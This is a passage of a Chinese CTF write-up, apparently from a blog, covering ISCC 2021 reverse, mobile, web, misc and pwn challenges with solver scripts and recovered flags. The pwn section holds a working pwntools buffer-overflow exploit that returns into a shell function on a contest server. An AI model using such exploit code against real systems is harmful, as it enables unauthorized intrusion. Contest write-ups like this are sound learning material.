class="line">flag=[<span class="number">0x1D</span>, <span class="number">0x55</span>, <span class="number">0x23</span>, <span class="number">0x68</span>, <span class="number">0x4A</span>, <span class="number">0x37</span>, <span class="number">0x2E</span>, <span class="number">0x38</span>, <span class="number">0x06</span>, <span class="number">0x16</span>, <span class="number">0x03</span>, <span class="number">0x72</span>, <span class="number">0x55</span>, <span class="number">0x4F</span>, <span class="number">0x3D</span>, <span class="number">0x5B</span>, <span class="number">0x62</span>, <span class="number">0x67</span>, <span class="number">0x39</span>, <span class="number">0x4A</span>, <span class="number">0x6D</span>, <span class="number">0x74</span>, <span class="number">0x47</span>, <span class="number">0x74</span>, <span class="number">0x60</span>, <span class="number">0x37</span>, <span class="number">0x55</span>, <span class="number">0x0B</span>, <span class="number">0x6E</span>, <span class="number">0x4E</span>, <span class="number">0x6A</span>, <span class="number">0x44</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x12</span>, <span class="number">0x30</span>, <span class="number">0x19</span>, <span class="number">0x3B</span>, <span class="number">0x4F</span>, <span class="number">0x56</span>, <span class="number">0x49</span>, <span class="number">0x61</span>, <span class="number">0x4D</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x2C</span>, <span class="number">0x71</span>, <span class="number">0x75</span>, <span class="number">0x3C</span>, <span class="number">0x67</span>, <span class="number">0x1D</span>, <span class="number">0x3B</span>, <span class="number">0x4B</span>, <span class="number">0x00</span>, <span class="number">0x7D</span>, <span class="number">0x59</span>]</span><br><span class="line">what=[<span class="number">0x64</span>, <span class="number">0x4E</span>, <span class="number">0x6C</span>, <span class="number">0x2E</span>, <span class="number">0x1E</span>, <span class="number">0x36</span>, <span class="number">0x38</span>, <span class="number">0x04</span>, <span class="number">0x44</span>, <span class="number">0x12</span>, <span class="number">0x1C</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0x59</span>, <span class="number">0x3D</span>, <span class="number">0x0B</span>, <span class="number">0x5A</span>, <span class="number">0x78</span>, <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x76</span>, <span class="number">0x70</span>, <span class="number">0x79</span>, <span class="number">0x33</span>, <span class="number">0x13</span>, <span class="number">0x16</span>, <span class="number">0x20</span>, <span class="number">0x7E</span>, <span class="number">0x6B</span>, <span class="number">0x23</span>, <span class="number">0x36</span>, <span class="number">0x45</span>, <span class="number">0x07</span>, <span class="number">0x11</span>, <span class="number">0x2C</span>, <span class="number">0x22</span>, <span class="number">0x4A</span>, <span class="number">0x4A</span>, <span class="number">0x4F</span>, <span class="number">0x2E</span>, <span class="number">0x48</span>, <span class="number">0x4C</span>, <span class="number">0x7C</span>, <span class="number">0x3E</span>, <span class="number">0x11</span>, <span class="number">0x0F</span>, <span class="number">0x6A</span>, <span class="number">0x18</span>, <span class="number">0x37</span>, <span class="number">0x42</span>, <span class="number">0x1E</span>, <span class="number">0x2B</span>, <span class="number">0x12</span>, <span class="number">0x03</span>, <span class="number">0x5A</span>, <span class="number">0x47</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">###### fake flag</span></span><br><span class="line"><span class="comment"># ans=&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># for i in range(len(what)):</span></span><br><span class="line"><span class="comment">#     ans+=chr(flag[i]^secret[i%len(secret)])</span></span><br><span class="line"><span class="comment"># print(ans)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    ans=[x]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(what)):</span><br><span class="line">        ans.append(ans[i<span class="number">-1</span>]^what[i<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ans)):</span><br><span class="line">        ans[i]^=secret[i%<span class="built_in">len</span>(secret)]</span><br><span class="line">        <span class="keyword">if</span> ans[i] <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>): <span class="comment"># 可见字符范围</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        myFlag=<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,ans))</span><br><span class="line">        print(<span class="string">&quot;ISCC&#123;&quot;</span>+myFlag+<span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p>可以看到：</p><p><img src="/p/wpFor-2021iscc/image-20210506135702474.png"></p><p>这就是我们的flag：<strong>ISCC{mAy6e_t0d4Y_7H15_ls_tH3_10n8est_f14g_Y0_HaD_Ev3R_5e3n_!_}</strong></p><h2 id="擂台题-150pt-Greedy-Snake"><a href="#擂台题-150pt-Greedy-Snake" class="headerlink" title="[擂台题 150pt] Greedy Snake"></a>[擂台题 150pt] Greedy Snake</h2><p>拖入ida发现报错<code>The imports segment seems to be destroyed. This MAY mean that the file was packed or otherwise modified in order to make it more difficult to analyze. If you want to see the imports segment in the original form, please reload it with the &#39;make imports section&#39; checkbox cleared.</code>。</p><p><img src="/p/wpFor-2021iscc/image-20210517191833742.png"></p><p>猜测有壳，用ExEinfoPE一查果然有upx壳</p><p><img src="/p/wpFor-2021iscc/image-20210517192045602.png"></p><p>然鹅并不能一键脱，报错<code>CantUnpackException: file is modified/hacked/protected; take care!!!</code>，应该是文件加壳后又加了混淆，搜到了这一篇：<a href="https://www.52pojie.cn/thread-326995-1-1.html">UPX防脱壳机脱壳、去除特征码、添加花指令小探 - 『脱壳破解区』 - 吾爱破解</a>。</p><p>查看程序的区段名发现果然有改：</p><p><img src="/p/wpFor-2021iscc/image-20210517194802336.png"></p><p><img src="/p/wpFor-2021iscc/image-20210517195405634.png"></p><p>用010Editor改区段名：</p><p><img src="/p/wpFor-2021iscc/image-20210517205244403.png"></p><p>除此之外还有这里被魔改的<code>UPX!</code>：</p><p><img src="/p/wpFor-2021iscc/image-20210517204950681.png"></p><p><img src="/p/wpFor-2021iscc/image-20210517205316677.png"></p><p>改完这两个地方终于可以脱壳了（<code>upx -d</code>）：</p><p><img src="/p/wpFor-2021iscc/image-20210517205340903.png"></p><p>用ida看脱壳后的程序：</p><p><img src="/p/wpFor-2021iscc/image-20210517205540905.png"></p><p>主函数有puts，直接查看交叉引用，能看到<code>flag_check()</code>函数：</p><p><img src="/p/wpFor-2021iscc/image-20210517205620058.png"></p><p>这就是出flag的地方，可以说逻辑非常明显了，base64甚至没有换表，xor处理部分根据xor的特性把加密流程重新走一遍就好。</p><p><img src="/p/wpFor-2021iscc/image-20210517205930766.png"></p><p>写exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">res=<span class="string">&quot;QFpKSnJWXFlRKFY8PFY8OVY8MVY9Z21WSz08bCJROVt0&quot;</span></span><br><span class="line">b64res=base64.b64decode(res).decode()</span><br><span class="line">l=<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">ord</span>,b64res))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(l)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(l)%i!=<span class="number">0</span>:</span><br><span class="line">            l[j]^=i</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l[j]^j</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,l))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>flag：<strong>ISCC{_UPX!_55_50_58_4nd_B45e+X0R}</strong></p><h1 id="MOBILE"><a href="#MOBILE" class="headerlink" title="MOBILE"></a>MOBILE</h1><h2 id="练武题-100pt-Mobile-Easy"><a href="#练武题-100pt-Mobile-Easy" class="headerlink" title="[练武题 100pt] Mobile Easy"></a>[练武题 100pt] Mobile Easy</h2><p>一个java层的apk题，甚至不用看so，用JEB反编译可以看到关键check函数是<code>getflag()</code></p><p><img src="/p/wpFor-2021iscc/image-20210506190609808.png"></p><p>蓝框就是我们需要到达的地方</p><p><img src="/p/wpFor-2021iscc/image-20210506190709704.png"></p><p>所以flag经过<code>first.firstStr()</code>处理后的形式是<code>ISCC&#123;xxxxxxxxxxyyyyyyyy&#125;</code>。</p><p><code>xxxxxxxxxx</code>经过<code>second.secondStr()</code>的check，<code>yyyyyyyy</code>则经过<code>third.thirdStr()</code>的check。</p><p>先看<code>second.secondStr()</code>，可以看到是一个ECB模式的AES，密文是<code>b64decode(&quot;9z2ukkD3Ztxhj+t/S1x1Eg==&quot;)</code>，密钥是<code>b&#39;1234567890123456&#39;</code>。</p><p><img src="/p/wpFor-2021iscc/image-20210506194617030.png"></p><p>至于是加密还是解密，可以看到<code>v7.init(2, ((Key)v6))</code>，而查常量有：</p><p><img src="/p/wpFor-2021iscc/image-20210506195606878.png"></p><p>所以这里是AES解密，就得到了前半部分的处理后字符串，注意最后要将空格替换掉。</p><p>再看<code>third.thirdStr(v2_1)</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">thirdStr</span><span class="params">(String arg14)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v1 = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span>(arg14.length() != v1) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> v0 = arg14.charAt(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> v4 = arg14.charAt(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> v5 = arg14.charAt(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> v6 = arg14.charAt(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">int</span> v7 = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">int</span> v8 = arg14.charAt(v7);</span><br><span class="line">    <span class="keyword">int</span> v9 = arg14.charAt(<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">int</span> v10 = arg14.charAt(<span class="number">6</span>);</span><br><span class="line">    <span class="keyword">int</span> v12 = arg14.charAt(<span class="number">7</span>);</span><br><span class="line">    <span class="keyword">if</span>(v0 % <span class="number">8</span> == <span class="number">7</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(v0 % <span class="number">9</span> != v1) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">int</span> v11 = <span class="number">100</span>;</span><br><span class="line">            <span class="keyword">if</span>(v4 - <span class="number">3</span> != v11) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>((v5 ^ <span class="number">93</span>) != v11) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(v5 * <span class="number">2</span> - <span class="number">10</span> != v6) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(v8 + <span class="number">1</span> != <span class="number">120</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>((v9 ^ v10) != <span class="number">56</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(v9 - v10 == <span class="number">24</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(v10 - v12 != v7) &#123;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span>(v12 != <span class="number">80</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是说<code>arg14=&#39;&#39;.join(map(chr,[v0,v4,v5,v6,v8,v9,v10,v12]))</code></p><p>可以轻松分析出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">v0 % <span class="number">8</span> == <span class="number">7</span></span><br><span class="line">v0 % <span class="number">9</span> == v1 <span class="comment">#v1=8</span></span><br><span class="line">v4 - <span class="number">3</span> == v11 <span class="comment">#v11=100</span></span><br><span class="line">v5 ^ <span class="number">93</span> == v11 <span class="comment">#v11=100</span></span><br><span class="line">v5 * <span class="number">2</span> - <span class="number">10</span> == v6</span><br><span class="line">v8 + <span class="number">1</span> == <span class="number">120</span></span><br><span class="line">(v9 ^ v10) == <span class="number">56</span></span><br><span class="line">v9 - v10 == <span class="number">24</span></span><br><span class="line">v10 - v12 == v7 <span class="comment">#v7=4</span></span><br><span class="line">v12 == <span class="number">80</span></span><br></pre></td></tr></table></figure><p>所以可以得出在可见字符范围内后半部分的值是<code>Gg9hwlTP</code>（过程统一放本题最后的exp里）。</p><p>最后分析<code>first.firstStr()</code>：</p><p><img src="/p/wpFor-2021iscc/image-20210506200139777.png"></p><p>就是一堆replace而已，逆向的话把替换前替换后反过来就好。</p><p>所以有整道题的exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### 前半部分</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">key=<span class="string">b&#x27;1234567890123456&#x27;</span></span><br><span class="line">aes=AES.new(key,AES.MODE_ECB)</span><br><span class="line">cipher=base64.b64decode(<span class="string">b&#x27;9z2ukkD3Ztxhj+t/S1x1Eg==&#x27;</span>)</span><br><span class="line">text=aes.decrypt(cipher)</span><br><span class="line">flag1=text.decode().replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># print(flag1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 后半部分</span></span><br><span class="line">v1=<span class="number">8</span></span><br><span class="line">v11=<span class="number">100</span></span><br><span class="line">v7=<span class="number">4</span></span><br><span class="line">v12=<span class="number">80</span></span><br><span class="line">v10=v12+v7</span><br><span class="line">v9=<span class="number">56</span>^v10</span><br><span class="line">v8=<span class="number">120</span><span class="number">-1</span></span><br><span class="line">v4=v11+<span class="number">3</span></span><br><span class="line">v5=v11^<span class="number">93</span></span><br><span class="line">v6=v5*<span class="number">2</span><span class="number">-10</span></span><br><span class="line"><span class="keyword">for</span> v0 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">    <span class="keyword">if</span> v0%<span class="number">8</span>==<span class="number">7</span> <span class="keyword">and</span> v0%<span class="number">9</span>==v1:</span><br><span class="line">        l=[v0,v4,v5,v6,v8,v9,v10,v12]</span><br><span class="line">        flag2=<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,l))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># print(flag2)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### replace处理</span></span><br><span class="line">flag=<span class="string">&quot;ISCC&#123;&quot;</span>+flag1+flag2+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line">flag=flag.replace(<span class="string">&quot;dN&quot;</span>,<span class="string">&quot;B1&quot;</span>).replace(<span class="string">&quot;8&quot;</span>,<span class="string">&quot;_&quot;</span>).replace(<span class="string">&quot;P&quot;</span>,<span class="string">&quot;!&quot;</span>).replace(<span class="string">&quot;hwl&quot;</span>,<span class="string">&quot;rea&quot;</span>).replace(<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;1&#x27;</span>).replace(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;m&quot;</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>flag：<strong>ISCC{m0B1lE_1s_Gg9reaT!}</strong></p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="练武题-50pt-ISCC客服冲冲冲（一）"><a href="#练武题-50pt-ISCC客服冲冲冲（一）" class="headerlink" title="[练武题 50pt] ISCC客服冲冲冲（一）"></a>[练武题 50pt] ISCC客服冲冲冲（一）</h2><p>改前端代码这两个地方，让左右元素的id互换，等完20s就好：</p><p><img src="/p/wpFor-2021iscc/image-20210506202040679.png"></p><p>拿到flag</p><p><img src="/p/wpFor-2021iscc/image-20210506202140298.png"></p><p>flag：<strong>ISCC{1SCC_2o2l_KeFuu}</strong></p><h2 id="练武题-50pt-这是啥"><a href="#练武题-50pt-这是啥" class="headerlink" title="[练武题 50pt] 这是啥"></a>[练武题 50pt] 这是啥</h2><p><code>F12</code>能看到一个<code>display:none;</code>的元素，这一看就是JSFuck（</p><p><img src="/p/wpFor-2021iscc/image-20210506232314333.png"></p><p>复制到控制台运行一下就好</p><p><img src="/p/wpFor-2021iscc/image-20210506232442683.png"></p><p>比较坑的是这里不能直接复制交flag，flag格式是大写的ISCC（……）</p><p>即：<strong>ISCC{what_is*_jsJS&amp;}</strong></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="练武题-50pt-Retrieve-the-passcode"><a href="#练武题-50pt-Retrieve-the-passcode" class="headerlink" title="[练武题 50pt] Retrieve the passcode"></a>[练武题 50pt] Retrieve the passcode</h2><p>解压得到一个压缩包和一个txt，压缩包解密要密码，所以从txt下手。</p><p>txt名字是<code>scatter</code>，这个刚好跟绘制散点图的函数同名，猜测每个分号间隔的是每个点的三维坐标，然后按<code>x:y:z</code>的顺序记录。</p><p>可以观察得到所有的z坐标都是1，所以可以直接不要，用python画出散点图：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;scatter.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    points=[x[:<span class="number">-2</span>].replace(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;,&#x27;</span>) <span class="keyword">for</span> x <span class="keyword">in</span> f.read().replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>).split(<span class="string">&#x27;;&#x27;</span>)]</span><br><span class="line">exec(<span class="string">&quot;points_list=[(&quot;</span>+<span class="string">&#x27;),(&#x27;</span>.join(points)+<span class="string">&quot;)]&quot;</span>)</span><br><span class="line">x=[t[<span class="number">0</span>] <span class="keyword">for</span> t <span class="keyword">in</span> points_list]</span><br><span class="line">y=[t[<span class="number">1</span>] <span class="keyword">for</span> t <span class="keyword">in</span> points_list]</span><br><span class="line">plt.scatter(x,y)</span><br><span class="line">plt.axis(<span class="string">&quot;equal&quot;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="/p/wpFor-2021iscc/image-20210506220206915.png"></p><p>由图像可以看到密码是<code>365728</code>，解开rar包，看到是pdf，电脑图案这里有一堆的点横，摩斯电码既视感。</p><p><img src="/p/wpFor-2021iscc/image-20210506222247621.png"></p><p>先用python解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">MorseList=&#123;</span><br><span class="line">    <span class="string">&quot;.-&quot;</span>: <span class="string">&quot;A&quot;</span>, <span class="string">&quot;-...&quot;</span>: <span class="string">&quot;B&quot;</span>, <span class="string">&quot;-.-.&quot;</span>: <span class="string">&quot;C&quot;</span>, <span class="string">&quot;-..&quot;</span>: <span class="string">&quot;D&quot;</span>, <span class="string">&quot;.&quot;</span>: <span class="string">&quot;E&quot;</span>, <span class="string">&quot;..-.&quot;</span>: <span class="string">&quot;F&quot;</span>, <span class="string">&quot;--.&quot;</span>: <span class="string">&quot;G&quot;</span>,</span><br><span class="line">    <span class="string">&quot;....&quot;</span>: <span class="string">&quot;H&quot;</span>, <span class="string">&quot;..&quot;</span>: <span class="string">&quot;I&quot;</span>, <span class="string">&quot;.---&quot;</span>: <span class="string">&quot;J&quot;</span>, <span class="string">&quot;-.-&quot;</span>: <span class="string">&quot;K&quot;</span>, <span class="string">&quot;.-..&quot;</span>: <span class="string">&quot;L&quot;</span>, <span class="string">&quot;--&quot;</span>: <span class="string">&quot;M&quot;</span>, <span class="string">&quot;-.&quot;</span>: <span class="string">&quot;N&quot;</span>,</span><br><span class="line">    <span class="string">&quot;---&quot;</span>: <span class="string">&quot;O&quot;</span>, <span class="string">&quot;.--．&quot;</span>: <span class="string">&quot;P&quot;</span>, <span class="string">&quot;--.-&quot;</span>: <span class="string">&quot;Q&quot;</span>, <span class="string">&quot;.-.&quot;</span>: <span class="string">&quot;R&quot;</span>, <span class="string">&quot;...&quot;</span>: <span class="string">&quot;S&quot;</span>, <span class="string">&quot;-&quot;</span>: <span class="string">&quot;T&quot;</span>,</span><br><span class="line">    <span class="string">&quot;..-&quot;</span>: <span class="string">&quot;U&quot;</span>, <span class="string">&quot;...-&quot;</span>: <span class="string">&quot;V&quot;</span>, <span class="string">&quot;.--&quot;</span>: <span class="string">&quot;W&quot;</span>, <span class="string">&quot;-..-&quot;</span>: <span class="string">&quot;X&quot;</span>, <span class="string">&quot;-.--&quot;</span>: <span class="string">&quot;Y&quot;</span>, <span class="string">&quot;--..&quot;</span>: <span class="string">&quot;Z&quot;</span>&#125;</span><br><span class="line">code=<span class="string">&quot;-.-. --- -. --. .-. .- - ..- .-.. .- - .. --- -. - .... . ..-. .-.. .- --. .. ... -.-. .... .- .-.. .-.. . -. --. . .. ... -.-. -.-. - .-- --- --.. . .-. --- - .-- --- --- -. .&quot;</span></span><br><span class="line">l=code.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> l:</span><br><span class="line">    flag+=MorseList[x]</span><br><span class="line">print(flag.lower())</span><br></pre></td></tr></table></figure><p>得到：</p><p><img src="/p/wpFor-2021iscc/image-20210506223141261.png"></p><p><code>congratulation the flag is challenge iscc two zero two one</code></p><p>题目描述说是小写字符串，不包括空格，所以拿到flag：**ISCC{congratulationtheflagischallengeiscctwozerotwoone}**（一开始被分词坑了&#x3D; &#x3D;没想到一整句都是flag）</p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="练武题-50pt-M78"><a href="#练武题-50pt-M78" class="headerlink" title="[练武题 50pt] M78"></a>[练武题 50pt] M78</h2><p>用ida打开，可以看到逻辑很简单，主要是走<code>explore()</code>函数。</p><p><img src="/p/wpFor-2021iscc/image-20210506224215673.png"></p><p><img src="/p/wpFor-2021iscc/image-20210506224247641.png"></p><p>read这边有限定字符数没有栈溢出，但是最后<code>return check(buf)</code>这里<code>strcpy()</code>没有检查长度，简单栈溢出。</p><p><img src="/p/wpFor-2021iscc/image-20210506225351289.png"></p><p>现在只要绕过<code>strlen()</code>就可，而v3是一字节的char，可以通过截取高位溢出绕过（也就是说构造一个长度为0x100+7的字符串发送即可）。</p><p>然后翻函数表可以看到这个get shell的函数，地址是<code>0x8049202</code>：</p><p><img src="/p/wpFor-2021iscc/image-20210506225439683.png"></p><p>所以写exp有：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># ------ Python2 ------</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># r=process(&quot;./M78&quot;)</span></span><br><span class="line">host=<span class="string">&quot;39.96.88.40&quot;</span></span><br><span class="line">port=<span class="number">7010</span></span><br><span class="line">r=remote(host,port)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;building&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;aaa&#x27;</span>) <span class="comment">#随便填</span></span><br><span class="line">r.recvuntil(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">getShell_addr=<span class="number">0x8049202</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">4</span>+p32(getShell_addr)</span><br><span class="line">payload=payload.ljust(<span class="number">256</span>+<span class="number">7</span><span class="number">-1</span>,<span class="string">&#x27;c&#x27;</span>) <span class="comment">#记得算上最后的换行符</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>成功打通~</p><p><img src="/p/wpFor-2021iscc/image-20210506231923672.png"></p><p>拿到flag：<strong>flag{N@x_addr_*EnaBleD%}</strong></p><p>aes</p>]]></content>
      
      
      <categories>
          
          <category> Write up </category>
          
      </categories>
      
      
